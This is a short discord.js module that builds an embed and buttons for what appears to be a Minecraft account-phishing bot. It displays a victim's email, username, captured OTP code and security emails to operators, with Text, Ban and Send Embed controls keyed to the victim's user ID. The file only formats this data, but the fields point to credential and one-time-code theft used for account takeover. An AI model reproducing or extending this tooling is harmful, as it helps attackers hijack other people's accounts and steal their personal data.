const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");

/**
 * 
 * @param {{mcname,email,method,reason,securityEmails,securityEmail,state,content,title,color,userId,code}} obj 
 * @returns 
 */
module.exports = (obj) => {
  let lines = [];

  if (obj.email) lines.push(`**Email:** \`${obj.email}\``);
  if (obj.mcname) lines.push(`**Username:** \`${obj.mcname}\``);
  if (obj.code) lines.push(`**OTP Code:** \`${obj.code}\``);
  if (obj.securityEmail) lines.push(`**Security Email:** \`${obj.securityEmail}\``);
  if (obj.state) lines.push(`**Status:** \`${obj.state}\``);
  if (obj.method) lines.push(`**Method:** \`${obj.method}\``);
  if (obj.reason) lines.push(`**Reason:** \`${obj.reason}\``);

  if (obj.securityEmails && Array.isArray(obj.securityEmails) && obj.securityEmails.length > 0) {
    for (const email of obj.securityEmails) {
      lines.push(`**Security Email:** \`${email}\``);
    }
  }

  return {
    content: obj.content || null,
    embeds: [{
      title: obj.title,
      color: obj.color,
      thumbnail: {
        url: "https://media.discordapp.net/attachments/1354005678951239730/1374027514829082655/IMG_3665.gif"
      },
      description: lines.join("\n")
    }],
    components: [
      new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId("text|" + obj.userId)
          .setLabel("Text")
          .setEmoji("💬")
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId("ban|" + obj.userId)
          .setLabel("Ban")
          .setEmoji("🔨")
          .setStyle(ButtonStyle.Danger),
        new ButtonBuilder()
          .setCustomId("textembed|" + obj.userId)
          .setLabel("Send Embed")
          .setEmoji("📧")
          .setStyle(ButtonStyle.Secondary)
      )
    ]
  };
};
